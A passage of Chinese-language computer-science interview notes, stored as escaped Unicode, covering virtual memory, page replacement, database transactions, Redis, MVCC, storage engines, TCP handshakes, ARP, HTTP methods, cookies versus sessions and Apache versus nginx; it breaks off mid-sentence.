\u865a\u62df\u5185\u5b58\u6280\u672f\n\n\u865a\u62df\u5b58\u50a8\u5668\u662f\u6307\u5177\u6709\u8bf7\u6c42\u8c03\u5165\u529f\u80fd\u548c\u7f6e\u6362\u529f\u80fd,\u80fd\u4ece\u903b\u8f91\u4e0a\u5bf9\u5185\u5b58\u5bb9\u91cf\u52a0\u4ee5\u6269\u5145\u7684\u4e00\u79cd\u5b58\u50a8\u7cfb\u7edf.\n\n## 7 \u5206\u9875\u548c\u5206\u6bb5\n\n\u5206\u9875: \u7528\u6237\u7a0b\u5e8f\u7684\u5730\u5740\u7a7a\u95f4\u88ab\u5212\u5206\u6210\u82e5\u5e72\u56fa\u5b9a\u5927\u5c0f\u7684\u533a\u57df\uff0c\u79f0\u4e3a\u201c\u9875\u201d\uff0c\u76f8\u5e94\u5730\uff0c\u5185\u5b58\u7a7a\u95f4\u5206\u6210\u82e5\u5e72\u4e2a\u7269\u7406\u5757\uff0c\u9875\u548c\u5757\u7684\u5927\u5c0f\u76f8\u7b49\u3002\u53ef\u5c06\u7528\u6237\u7a0b\u5e8f\u7684\u4efb\u4e00\u9875\u653e\u5728\u5185\u5b58\u7684\u4efb\u4e00\u5757\u4e2d\uff0c\u5b9e\u73b0\u4e86\u79bb\u6563\u5206\u914d\u3002\n\n\u5206\u6bb5: \u5c06\u7528\u6237\u7a0b\u5e8f\u5730\u5740\u7a7a\u95f4\u5206\u6210\u82e5\u5e72\u4e2a\u5927\u5c0f\u4e0d\u7b49\u7684\u6bb5\uff0c\u6bcf\u6bb5\u53ef\u4ee5\u5b9a\u4e49\u4e00\u7ec4\u76f8\u5bf9\u5b8c\u6574\u7684\u903b\u8f91\u4fe1\u606f\u3002\u5b58\u50a8\u5206\u914d\u65f6\uff0c\u4ee5\u6bb5\u4e3a\u5355\u4f4d\uff0c\u6bb5\u4e0e\u6bb5\u5728\u5185\u5b58\u4e2d\u53ef\u4ee5\u4e0d\u76f8\u90bb\u63a5\uff0c\u4e5f\u5b9e\u73b0\u4e86\u79bb\u6563\u5206\u914d\u3002\n\n### \u5206\u9875\u4e0e\u5206\u6bb5\u7684\u4e3b\u8981\u533a\u522b\n\n1. \u9875\u662f\u4fe1\u606f\u7684\u7269\u7406\u5355\u4f4d,\u5206\u9875\u662f\u4e3a\u4e86\u5b9e\u73b0\u975e\u8fde\u7eed\u5206\u914d,\u4ee5\u4fbf\u89e3\u51b3\u5185\u5b58\u788e\u7247\u95ee\u9898,\u6216\u8005\u8bf4\u5206\u9875\u662f\u7531\u4e8e\u7cfb\u7edf\u7ba1\u7406\u7684\u9700\u8981.\u6bb5\u662f\u4fe1\u606f\u7684\u903b\u8f91\u5355\u4f4d,\u5b83\u542b\u6709\u4e00\u7ec4\u610f\u4e49\u76f8\u5bf9\u5b8c\u6574\u7684\u4fe1\u606f,\u5206\u6bb5\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u5b9e\u73b0\u5171\u4eab,\u6ee1\u8db3\u7528\u6237\u7684\u9700\u8981.\n2. \u9875\u7684\u5927\u5c0f\u56fa\u5b9a,\u7531\u7cfb\u7edf\u786e\u5b9a,\u5c06\u903b\u8f91\u5730\u5740\u5212\u5206\u4e3a\u9875\u53f7\u548c\u9875\u5185\u5730\u5740\u662f\u7531\u673a\u5668\u786c\u4ef6\u5b9e\u73b0\u7684.\u800c\u6bb5\u7684\u957f\u5ea6\u5374\u4e0d\u56fa\u5b9a,\u51b3\u5b9a\u4e8e\u7528\u6237\u6240\u7f16\u5199\u7684\u7a0b\u5e8f,\u901a\u5e38\u7531\u7f16\u8bd1\u7a0b\u5e8f\u5728\u5bf9\u6e90\u7a0b\u5e8f\u8fdb\u884c\u7f16\u8bd1\u65f6\u6839\u636e\u4fe1\u606f\u7684\u6027\u8d28\u6765\u5212\u5206.\n3. \u5206\u9875\u7684\u4f5c\u4e1a\u5730\u5740\u7a7a\u95f4\u662f\u4e00\u7ef4\u7684.\u5206\u6bb5\u7684\u5730\u5740\u7a7a\u95f4\u662f\u4e8c\u7ef4\u7684.\n\n## 8 \u9875\u9762\u7f6e\u6362\u7b97\u6cd5\n\n1. \u6700\u4f73\u7f6e\u6362\u7b97\u6cd5OPT:\u4e0d\u53ef\u80fd\u5b9e\u73b0\n2. \u5148\u8fdb\u5148\u51faFIFO\n3. \u6700\u8fd1\u6700\u4e45\u672a\u4f7f\u7528\u7b97\u6cd5LRU:\u6700\u8fd1\u4e00\u6bb5\u65f6\u95f4\u91cc\u6700\u4e45\u6ca1\u6709\u4f7f\u7528\u8fc7\u7684\u9875\u9762\u4e88\u4ee5\u7f6e\u6362.\n4. clock\u7b97\u6cd5\n\n## 9 \u8fb9\u6cbf\u89e6\u53d1\u548c\u6c34\u5e73\u89e6\u53d1\n\n\u8fb9\u7f18\u89e6\u53d1\u662f\u6307\u6bcf\u5f53\u72b6\u6001\u53d8\u5316\u65f6\u53d1\u751f\u4e00\u4e2a io \u4e8b\u4ef6\uff0c\u6761\u4ef6\u89e6\u53d1\u662f\u53ea\u8981\u6ee1\u8db3\u6761\u4ef6\u5c31\u53d1\u751f\u4e00\u4e2a io \u4e8b\u4ef6\n\n# \u6570\u636e\u5e93\n\n## 1 \u4e8b\u52a1\n\n\u6570\u636e\u5e93\u4e8b\u52a1(Database Transaction) \uff0c\u662f\u6307\u4f5c\u4e3a\u5355\u4e2a\u903b\u8f91\u5de5\u4f5c\u5355\u5143\u6267\u884c\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\uff0c\u8981\u4e48\u5b8c\u5168\u5730\u6267\u884c\uff0c\u8981\u4e48\u5b8c\u5168\u5730\u4e0d\u6267\u884c\u3002\n\u5f7b\u5e95\u7406\u89e3\u6570\u636e\u5e93\u4e8b\u52a1: http:\/\/www.hollischuang.com\/archives\/898\n\n## 2 \u6570\u636e\u5e93\u7d22\u5f15\n\n\u63a8\u8350: http:\/\/tech.meituan.com\/mysql-index.html\n\n[MySQL\u7d22\u5f15\u80cc\u540e\u7684\u6570\u636e\u7ed3\u6784\u53ca\u7b97\u6cd5\u539f\u7406](http:\/\/blog.codinglabs.org\/articles\/theory-of-mysql-index.html)\n\n\u805a\u96c6\u7d22\u5f15,\u975e\u805a\u96c6\u7d22\u5f15,B-Tree,B+Tree,\u6700\u5de6\u524d\u7f00\u539f\u7406\n\n## 3 Redis\u539f\u7406\n\n### Redis\u662f\u4ec0\u4e48\uff1f\n\n1. \u662f\u4e00\u4e2a\u5b8c\u5168\u5f00\u6e90\u514d\u8d39\u7684key-value\u5185\u5b58\u6570\u636e\u5e93 \n2. \u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u670d\u52a1\u5668\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u5176\u6709\u7740\u4e30\u5bcc\u7684\u6570\u636e\u7ed3\u6784 strings\u3001map\u3001 list\u3001sets\u3001 sorted sets\n\n### Redis\u6570\u636e\u5e93\n\n> \u200b\t\u901a\u5e38\u5c40\u9650\u70b9\u6765\u8bf4\uff0cRedis\u4e5f\u4ee5\u6d88\u606f\u961f\u5217\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u4f5c\u4e3a\u5185\u5d4c\u7684List\u5b58\u5728\uff0c\u6ee1\u8db3\u5b9e\u65f6\u7684\u9ad8\u5e76\u53d1\u9700\u6c42\u3002\u5728\u4f7f\u7528\u7f13\u5b58\u7684\u65f6\u5019\uff0credis\u6bd4memcached\u5177\u6709\u66f4\u591a\u7684\u4f18\u52bf\uff0c\u5e76\u4e14\u652f\u6301\u66f4\u591a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u628aredis\u5f53\u4f5c\u4e00\u4e2a\u4e2d\u95f4\u5b58\u50a8\u7cfb\u7edf\uff0c\u7528\u6765\u5904\u7406\u9ad8\u5e76\u53d1\u7684\u6570\u636e\u5e93\u64cd\u4f5c\n\n- \u901f\u5ea6\u5feb\uff1a\u4f7f\u7528\u6807\u51c6C\u5199\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u5185\u5b58\u4e2d\u5b8c\u6210\uff0c\u8bfb\u5199\u901f\u5ea6\u5206\u522b\u8fbe\u523010\u4e07\/20\u4e07 \n- \u6301\u4e45\u5316\uff1a\u5bf9\u6570\u636e\u7684\u66f4\u65b0\u91c7\u7528Copy-on-write\u6280\u672f\uff0c\u53ef\u4ee5\u5f02\u6b65\u5730\u4fdd\u5b58\u5230\u78c1\u76d8\u4e0a\uff0c\u4e3b\u8981\u6709\u4e24\u79cd\u7b56\u7565\uff0c\u4e00\u662f\u6839\u636e\u65f6\u95f4\uff0c\u66f4\u65b0\u6b21\u6570\u7684\u5feb\u7167\uff08save 300 10 \uff09\u4e8c\u662f\u57fa\u4e8e\u8bed\u53e5\u8ffd\u52a0\u65b9\u5f0f(Append-only file\uff0caof) \n- \u81ea\u52a8\u64cd\u4f5c\uff1a\u5bf9\u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684\u64cd\u4f5c\u90fd\u662f\u81ea\u52a8\u7684\uff0c\u5f88\u5b89\u5168 \n- \u5feb\u901f\u7684\u4e3b--\u4ece\u590d\u5236\uff0c\u5b98\u65b9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6570\u636e\uff0cSlave\u572821\u79d2\u5373\u5b8c\u6210\u4e86\u5bf9Amazon\u7f51\u7ad910G key set\u7684\u590d\u5236\u3002 \n- Sharding\u6280\u672f\uff1a \u5f88\u5bb9\u6613\u5c06\u6570\u636e\u5206\u5e03\u5230\u591a\u4e2aRedis\u5b9e\u4f8b\u4e2d\uff0c\u6570\u636e\u5e93\u7684\u6269\u5c55\u662f\u4e2a\u6c38\u6052\u7684\u8bdd\u9898\uff0c\u5728\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\uff0c\u4e3b\u8981\u662f\u4ee5\u6dfb\u52a0\u786c\u4ef6\u3001\u4ee5\u5206\u533a\u4e3a\u4e3b\u8981\u6280\u672f\u5f62\u5f0f\u7684\u7eb5\u5411\u6269\u5c55\u89e3\u51b3\u4e86\u5f88\u591a\u7684\u5e94\u7528\u573a\u666f\uff0c\u4f46\u968f\u7740web2.0\u3001\u79fb\u52a8\u4e92\u8054\u7f51\u3001\u4e91\u8ba1\u7b97\u7b49\u5e94\u7528\u7684\u5174\u8d77\uff0c\u8fd9\u79cd\u6269\u5c55\u6a21\u5f0f\u5df2\u7ecf\u4e0d\u592a\u9002\u5408\u4e86\uff0c\u6240\u4ee5\u8fd1\u5e74\u6765\uff0c\u50cf\u91c7\u7528\u4e3b\u4ece\u914d\u7f6e\u3001\u6570\u636e\u5e93\u590d\u5236\u5f62\u5f0f\u7684\uff0cSharding\u8fd9\u79cd\u6280\u672f\u628a\u8d1f\u8f7d\u5206\u5e03\u5230\u591a\u4e2a\u7279\u7406\u8282\u70b9\u4e0a\u53bb\u7684\u6a2a\u5411\u6269\u5c55\u65b9\u5f0f\u7528\u5904\u8d8a\u6765\u8d8a\u591a\u3002\n\n### Redis\u7f3a\u70b9\n\n- \u662f\u6570\u636e\u5e93\u5bb9\u91cf\u53d7\u5230\u7269\u7406\u5185\u5b58\u7684\u9650\u5236,\u4e0d\u80fd\u7528\u4f5c\u6d77\u91cf\u6570\u636e\u7684\u9ad8\u6027\u80fd\u8bfb\u5199,\u56e0\u6b64Redis\u9002\u5408\u7684\u573a\u666f\u4e3b\u8981\u5c40\u9650\u5728\u8f83\u5c0f\u6570\u636e\u91cf\u7684\u9ad8\u6027\u80fd\u64cd\u4f5c\u548c\u8fd0\u7b97\u4e0a\u3002\n- Redis\u8f83\u96be\u652f\u6301\u5728\u7ebf\u6269\u5bb9\uff0c\u5728\u96c6\u7fa4\u5bb9\u91cf\u8fbe\u5230\u4e0a\u9650\u65f6\u5728\u7ebf\u6269\u5bb9\u4f1a\u53d8\u5f97\u5f88\u590d\u6742\u3002\u4e3a\u907f\u514d\u8fd9\u4e00\u95ee\u9898\uff0c\u8fd0\u7ef4\u4eba\u5458\u5728\u7cfb\u7edf\u4e0a\u7ebf\u65f6\u5fc5\u987b\u786e\u4fdd\u6709\u8db3\u591f\u7684\u7a7a\u95f4\uff0c\u8fd9\u5bf9\u8d44\u6e90\u9020\u6210\u4e86\u5f88\u5927\u7684\u6d6a\u8d39\u3002\n\n\n## 4 \u4e50\u89c2\u9501\u548c\u60b2\u89c2\u9501\n\n\u60b2\u89c2\u9501\uff1a\u5047\u5b9a\u4f1a\u53d1\u751f\u5e76\u53d1\u51b2\u7a81\uff0c\u5c4f\u853d\u4e00\u5207\u53ef\u80fd\u8fdd\u53cd\u6570\u636e\u5b8c\u6574\u6027\u7684\u64cd\u4f5c\n\n\u4e50\u89c2\u9501\uff1a\u5047\u8bbe\u4e0d\u4f1a\u53d1\u751f\u5e76\u53d1\u51b2\u7a81\uff0c\u53ea\u5728\u63d0\u4ea4\u64cd\u4f5c\u65f6\u68c0\u67e5\u662f\u5426\u8fdd\u53cd\u6570\u636e\u5b8c\u6574\u6027\u3002\n\n\u4e50\u89c2\u9501\u4e0e\u60b2\u89c2\u9501\u7684\u5177\u4f53\u533a\u522b: http:\/\/www.cnblogs.com\/Bob-FD\/p\/3352216.html\n\n## 5 MVCC\n\n\n> \u200b\t\u5168\u79f0\u662fMulti-Version Concurrent Control\uff0c\u5373\u591a\u7248\u672c\u5e76\u53d1\u63a7\u5236\uff0c\u5728MVCC\u534f\u8bae\u4e0b\uff0c\u6bcf\u4e2a\u8bfb\u64cd\u4f5c\u4f1a\u770b\u5230\u4e00\u4e2a\u4e00\u81f4\u6027\u7684snapshot\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b9e\u73b0\u975e\u963b\u585e\u7684\u8bfb\u3002MVCC\u5141\u8bb8\u6570\u636e\u5177\u6709\u591a\u4e2a\u7248\u672c\uff0c\u8fd9\u4e2a\u7248\u672c\u53ef\u4ee5\u662f\u65f6\u95f4\u6233\u6216\u8005\u662f\u5168\u5c40\u9012\u589e\u7684\u4e8b\u52a1ID\uff0c\u5728\u540c\u4e00\u4e2a\u65f6\u95f4\u70b9\uff0c\u4e0d\u540c\u7684\u4e8b\u52a1\u770b\u5230\u7684\u6570\u636e\u662f\u4e0d\u540c\u7684\u3002\n\n### [MySQL](http:\/\/lib.csdn.net\/base\/mysql)\u7684innodb\u5f15\u64ce\u662f\u5982\u4f55\u5b9e\u73b0MVCC\u7684\n\ninnodb\u4f1a\u4e3a\u6bcf\u4e00\u884c\u6dfb\u52a0\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u8868\u793a\u8be5\u884c**\u521b\u5efa\u7684\u7248\u672c**\u548c**\u5220\u9664\u7684\u7248\u672c**\uff0c\u586b\u5165\u7684\u662f\u4e8b\u52a1\u7684\u7248\u672c\u53f7\uff0c\u8fd9\u4e2a\u7248\u672c\u53f7\u968f\u7740\u4e8b\u52a1\u7684\u521b\u5efa\u4e0d\u65ad\u9012\u589e\u3002\u5728repeated read\u7684\u9694\u79bb\u7ea7\u522b\uff08[\u4e8b\u52a1\u7684\u9694\u79bb\u7ea7\u522b\u8bf7\u770b\u8fd9\u7bc7\u6587\u7ae0](http:\/\/blog.csdn.net\/chosen0ne\/article\/details\/10036775)\uff09\u4e0b\uff0c\u5177\u4f53\u5404\u79cd\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u5b9e\u73b0\uff1a\n\n- select\uff1a\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6innodb\u4f1a\u8fd4\u56de\u8be5\u884c\u6570\u636e\uff1a\n  - \u8be5\u884c\u7684\u521b\u5efa\u7248\u672c\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5f53\u524d\u7248\u672c\u53f7\uff0c\u7528\u4e8e\u4fdd\u8bc1\u5728select\u64cd\u4f5c\u4e4b\u524d\u6240\u6709\u7684\u64cd\u4f5c\u5df2\u7ecf\u6267\u884c\u843d\u5730\u3002\n  - \u8be5\u884c\u7684\u5220\u9664\u7248\u672c\u53f7\u5927\u4e8e\u5f53\u524d\u7248\u672c\u6216\u8005\u4e3a\u7a7a\u3002\u5220\u9664\u7248\u672c\u53f7\u5927\u4e8e\u5f53\u524d\u7248\u672c\u610f\u5473\u7740\u6709\u4e00\u4e2a\u5e76\u53d1\u4e8b\u52a1\u5c06\u8be5\u884c\u5220\u9664\u4e86\u3002\n- insert\uff1a\u5c06\u65b0\u63d2\u5165\u7684\u884c\u7684\u521b\u5efa\u7248\u672c\u53f7\u8bbe\u7f6e\u4e3a\u5f53\u524d\u7cfb\u7edf\u7684\u7248\u672c\u53f7\u3002\n- delete\uff1a\u5c06\u8981\u5220\u9664\u7684\u884c\u7684\u5220\u9664\u7248\u672c\u53f7\u8bbe\u7f6e\u4e3a\u5f53\u524d\u7cfb\u7edf\u7684\u7248\u672c\u53f7\u3002\n- update\uff1a\u4e0d\u6267\u884c\u539f\u5730update\uff0c\u800c\u662f\u8f6c\u6362\u6210insert + delete\u3002\u5c06\u65e7\u884c\u7684\u5220\u9664\u7248\u672c\u53f7\u8bbe\u7f6e\u4e3a\u5f53\u524d\u7248\u672c\u53f7\uff0c\u5e76\u5c06\u65b0\u884cinsert\u540c\u65f6\u8bbe\u7f6e\u521b\u5efa\u7248\u672c\u53f7\u4e3a\u5f53\u524d\u7248\u672c\u53f7\u3002\n\n\u5176\u4e2d\uff0c\u5199\u64cd\u4f5c\uff08insert\u3001delete\u548cupdate\uff09\u6267\u884c\u65f6\uff0c\u9700\u8981\u5c06\u7cfb\u7edf\u7248\u672c\u53f7\u9012\u589e\u3002\n\n\u200b\t\u7531\u4e8e\u65e7\u6570\u636e\u5e76\u4e0d\u771f\u6b63\u7684\u5220\u9664\uff0c\u6240\u4ee5\u5fc5\u987b\u5bf9\u8fd9\u4e9b\u6570\u636e\u8fdb\u884c\u6e05\u7406\uff0cinnodb\u4f1a\u5f00\u542f\u4e00\u4e2a\u540e\u53f0\u7ebf\u7a0b\u6267\u884c\u6e05\u7406\u5de5\u4f5c\uff0c\u5177\u4f53\u7684\u89c4\u5219\u662f\u5c06\u5220\u9664\u7248\u672c\u53f7\u5c0f\u4e8e\u5f53\u524d\u7cfb\u7edf\u7248\u672c\u7684\u884c\u5220\u9664\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u53eb\u505apurge\u3002\n\n\u901a\u8fc7MVCC\u5f88\u597d\u7684\u5b9e\u73b0\u4e86\u4e8b\u52a1\u7684\u9694\u79bb\u6027\uff0c\u53ef\u4ee5\u8fbe\u5230repeated read\u7ea7\u522b\uff0c\u8981\u5b9e\u73b0serializable\u8fd8\u5fc5\u987b\u52a0\u9501\u3002\n\n>  \u53c2\u8003\uff1a[MVCC\u6d45\u6790](http:\/\/blog.csdn.net\/chosen0ne\/article\/details\/18093187)\n\n\n\n## 6 MyISAM\u548cInnoDB\n\nMyISAM \u9002\u5408\u4e8e\u4e00\u4e9b\u9700\u8981\u5927\u91cf\u67e5\u8be2\u7684\u5e94\u7528\uff0c\u4f46\u5176\u5bf9\u4e8e\u6709\u5927\u91cf\u5199\u64cd\u4f5c\u5e76\u4e0d\u662f\u5f88\u597d\u3002\u751a\u81f3\u4f60\u53ea\u662f\u9700\u8981update\u4e00\u4e2a\u5b57\u6bb5\uff0c\u6574\u4e2a\u8868\u90fd\u4f1a\u88ab\u9501\u8d77\u6765\uff0c\u800c\u522b\u7684\u8fdb\u7a0b\uff0c\u5c31\u7b97\u662f\u8bfb\u8fdb\u7a0b\u90fd\u65e0\u6cd5\u64cd\u4f5c\u76f4\u5230\u8bfb\u64cd\u4f5c\u5b8c\u6210\u3002\u53e6\u5916\uff0cMyISAM \u5bf9\u4e8e SELECT COUNT(*) \u8fd9\u7c7b\u7684\u8ba1\u7b97\u662f\u8d85\u5feb\u65e0\u6bd4\u7684\u3002\n\nInnoDB \u7684\u8d8b\u52bf\u4f1a\u662f\u4e00\u4e2a\u975e\u5e38\u590d\u6742\u7684\u5b58\u50a8\u5f15\u64ce\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u5c0f\u7684\u5e94\u7528\uff0c\u5b83\u4f1a\u6bd4 MyISAM \u8fd8\u6162\u3002\u4ed6\u662f\u5b83\u652f\u6301\u201c\u884c\u9501\u201d \uff0c\u4e8e\u662f\u5728\u5199\u64cd\u4f5c\u6bd4\u8f83\u591a\u7684\u65f6\u5019\uff0c\u4f1a\u66f4\u4f18\u79c0\u3002\u5e76\u4e14\uff0c\u4ed6\u8fd8\u652f\u6301\u66f4\u591a\u7684\u9ad8\u7ea7\u5e94\u7528\uff0c\u6bd4\u5982\uff1a\u4e8b\u52a1\u3002\n\nmysql \u6570\u636e\u5e93\u5f15\u64ce: http:\/\/www.cnblogs.com\/0201zcr\/p\/5296843.html\nMySQL\u5b58\u50a8\u5f15\u64ce\uff0d\uff0dMyISAM\u4e0eInnoDB\u533a\u522b: https:\/\/segmentfault.com\/a\/1190000008227211\n\n# \u7f51\u7edc\n\n## 1 \u4e09\u6b21\u63e1\u624b\n\n1. \u5ba2\u6237\u7aef\u901a\u8fc7\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u4e00\u4e2aSYN\u6765\u521b\u5efa\u4e00\u4e2a\u4e3b\u52a8\u6253\u5f00\uff0c\u4f5c\u4e3a\u4e09\u6b21\u63e1\u624b\u7684\u4e00\u90e8\u5206\u3002\u5ba2\u6237\u7aef\u628a\u8fd9\u6bb5\u8fde\u63a5\u7684\u5e8f\u53f7\u8bbe\u5b9a\u4e3a\u968f\u673a\u6570 A\u3002\n2. \u670d\u52a1\u5668\u7aef\u5e94\u5f53\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684SYN\u56de\u9001\u4e00\u4e2aSYN\/ACK\u3002ACK \u7684\u786e\u8ba4\u7801\u5e94\u4e3a A+1\uff0cSYN\/ACK \u5305\u672c\u8eab\u53c8\u6709\u4e00\u4e2a\u968f\u673a\u5e8f\u53f7 B\u3002\n3. \u6700\u540e\uff0c\u5ba2\u6237\u7aef\u518d\u53d1\u9001\u4e00\u4e2aACK\u3002\u5f53\u670d\u52a1\u7aef\u53d7\u5230\u8fd9\u4e2aACK\u7684\u65f6\u5019\uff0c\u5c31\u5b8c\u6210\u4e86\u4e09\u8def\u63e1\u624b\uff0c\u5e76\u8fdb\u5165\u4e86\u8fde\u63a5\u521b\u5efa\u72b6\u6001\u3002\u6b64\u65f6\u5305\u5e8f\u53f7\u88ab\u8bbe\u5b9a\u4e3a\u6536\u5230\u7684\u786e\u8ba4\u53f7 A+1\uff0c\u800c\u54cd\u5e94\u5219\u4e3a B+1\u3002\n\n## 2 \u56db\u6b21\u6325\u624b\n\n_\u6ce8\u610f: \u4e2d\u65ad\u8fde\u63a5\u7aef\u53ef\u4ee5\u662f\u5ba2\u6237\u7aef\uff0c\u4e5f\u53ef\u4ee5\u662f\u670d\u52a1\u5668\u7aef. \u4e0b\u9762\u4ec5\u4ee5\u5ba2\u6237\u7aef\u65ad\u5f00\u8fde\u63a5\u4e3e\u4f8b, \u53cd\u4e4b\u4ea6\u7136._\n\n1. \u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5206\u6bb5, \u5176\u4e2d\u7684 FIN \u6807\u8bb0\u8bbe\u7f6e\u4e3a1. \u5ba2\u6237\u7aef\u8fdb\u5165 FIN-WAIT \u72b6\u6001. \u8be5\u72b6\u6001\u4e0b\u5ba2\u6237\u7aef\u53ea\u63a5\u6536\u6570\u636e, \u4e0d\u518d\u53d1\u9001\u6570\u636e.\n2. \u670d\u52a1\u5668\u63a5\u6536\u5230\u5e26\u6709 FIN = 1 \u7684\u6570\u636e\u5206\u6bb5, \u53d1\u9001\u5e26\u6709 ACK = 1 \u7684\u5269\u4f59\u6570\u636e\u5206\u6bb5, \u786e\u8ba4\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u6765\u7684 FIN \u4fe1\u606f.\n3. \u670d\u52a1\u5668\u7b49\u5230\u6240\u6709\u6570\u636e\u4f20\u8f93\u7ed3\u675f, \u5411\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u5e26\u6709 FIN = 1 \u7684\u6570\u636e\u5206\u6bb5, \u5e76\u8fdb\u5165 CLOSE-WAIT \u72b6\u6001, \u7b49\u5f85\u5ba2\u6237\u7aef\u53d1\u6765\u5e26\u6709 ACK = 1 \u7684\u786e\u8ba4\u62a5\u6587.\n4. \u5ba2\u6237\u7aef\u6536\u5230\u670d\u52a1\u5668\u53d1\u6765\u5e26\u6709 FIN = 1 \u7684\u62a5\u6587, \u8fd4\u56de ACK = 1 \u7684\u62a5\u6587\u786e\u8ba4, \u4e3a\u4e86\u9632\u6b62\u670d\u52a1\u5668\u7aef\u672a\u6536\u5230\u9700\u8981\u91cd\u53d1, \u8fdb\u5165 TIME-WAIT \u72b6\u6001. \u670d\u52a1\u5668\u63a5\u6536\u5230\u62a5\u6587\u540e\u5173\u95ed\u8fde\u63a5. \u5ba2\u6237\u7aef\u7b49\u5f85 2MSL \u540e\u672a\u6536\u5230\u56de\u590d, \u5219\u8ba4\u4e3a\u670d\u52a1\u5668\u6210\u529f\u5173\u95ed, \u5ba2\u6237\u7aef\u5173\u95ed\u8fde\u63a5.\n\n\u56fe\u89e3: http:\/\/blog.csdn.net\/whuslei\/article\/details\/6667471\n\n## 3 ARP\u534f\u8bae\n\n\u5730\u5740\u89e3\u6790\u534f\u8bae(Address Resolution Protocol)\uff0c\u5176\u57fa\u672c\u529f\u80fd\u4e3a\u900f\u8fc7\u76ee\u6807\u8bbe\u5907\u7684IP\u5730\u5740\uff0c\u67e5\u8be2\u76ee\u6807\u7684MAC\u5730\u5740\uff0c\u4ee5\u4fdd\u8bc1\u901a\u4fe1\u7684\u987a\u5229\u8fdb\u884c\u3002\u5b83\u662fIPv4\u7f51\u7edc\u5c42\u5fc5\u4e0d\u53ef\u5c11\u7684\u534f\u8bae\uff0c\u4e0d\u8fc7\u5728IPv6\u4e2d\u5df2\u4e0d\u518d\u9002\u7528\uff0c\u5e76\u88ab\u90bb\u5c45\u53d1\u73b0\u534f\u8bae\uff08NDP\uff09\u6240\u66ff\u4ee3\u3002\n\n## 4 urllib\u548curllib2\u7684\u533a\u522b\n\n\u8fd9\u4e2a\u9762\u8bd5\u5b98\u786e\u5b9e\u95ee\u8fc7,\u5f53\u65f6\u7b54\u7684urllib2\u53ef\u4ee5Post\u800curllib\u4e0d\u53ef\u4ee5.\n\n1. urllib\u63d0\u4f9burlencode\u65b9\u6cd5\u7528\u6765GET\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u4ea7\u751f\uff0c\u800curllib2\u6ca1\u6709\u3002\u8fd9\u662f\u4e3a\u4f55urllib\u5e38\u548curllib2\u4e00\u8d77\u4f7f\u7528\u7684\u539f\u56e0\u3002\n2. urllib2\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2aRequest\u7c7b\u7684\u5b9e\u4f8b\u6765\u8bbe\u7f6eURL\u8bf7\u6c42\u7684headers\uff0curllib\u4ec5\u53ef\u4ee5\u63a5\u53d7URL\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4f60\u4e0d\u53ef\u4ee5\u4f2a\u88c5\u4f60\u7684User Agent\u5b57\u7b26\u4e32\u7b49\u3002\n\n\n## 5 Post\u548cGet\n[GET\u548cPOST\u6709\u4ec0\u4e48\u533a\u522b\uff1f\u53ca\u4e3a\u4ec0\u4e48\u7f51\u4e0a\u7684\u591a\u6570\u7b54\u6848\u90fd\u662f\u9519\u7684](http:\/\/www.cnblogs.com\/nankezhishi\/archive\/2012\/06\/09\/getandpost.html)\n[\u77e5\u4e4e\u56de\u7b54](https:\/\/www.zhihu.com\/question\/31640769?rf=37401322)\n\nget: [RFC 2616 - Hypertext Transfer Protocol -- HTTP\/1.1](http:\/\/tools.ietf.org\/html\/rfc2616#section-9.3)\npost: [RFC 2616 - Hypertext Transfer Protocol -- HTTP\/1.1](http:\/\/tools.ietf.org\/html\/rfc2616#section-9.5)\n\n\n\n## 6 Cookie\u548cSession\n\n|      | Cookie                     | Session |\n| :--- | :------------------------- | :------ |\n| \u50a8\u5b58\u4f4d\u7f6e | \u5ba2\u6237\u7aef                        | \u670d\u52a1\u5668\u7aef    |\n| \u76ee\u7684   | \u8ddf\u8e2a\u4f1a\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u4fdd\u5b58\u7528\u6237\u504f\u597d\u8bbe\u7f6e\u6216\u8005\u4fdd\u5b58\u7528\u6237\u540d\u5bc6\u7801\u7b49 | \u8ddf\u8e2a\u4f1a\u8bdd    |\n| \u5b89\u5168\u6027  | \u4e0d\u5b89\u5168                        | \u5b89\u5168      |\n\nsession\u6280\u672f\u662f\u8981\u4f7f\u7528\u5230cookie\u7684\uff0c\u4e4b\u6240\u4ee5\u51fa\u73b0session\u6280\u672f\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u5b89\u5168\u3002\n\n## 7 apache\u548cnginx\u7684\u533a\u522b\n\nnginx \u76f8\u5bf9 apache \u7684\u4f18\u70b9\uff1a\n* \u8f7b\u91cf\u7ea7\uff0c\u540c\u6837\u8d77web \u670d\u52a1\uff0c\u6bd4apache \u5360\u7528\u66f4\u5c11\u7684\u5185\u5b58\u53ca\u8d44\u6e90\n* \u6297\u5e76\u53d1\uff0cnginx \u5904\u7406\u8bf7\u6c42\u662f\u5f02\u6b65\u975e\u963b\u585e\u7684\uff0c\u652f\u6301\u66f4\u591a\u7684\u5e76\u53d1\u8fde\u63a5\uff0c\u800capache \u5219\u662f\u963b\u585e\u578b\u7684\uff0c\u5728\u9ad8\u5e76\u53d1\u4e0bnginx 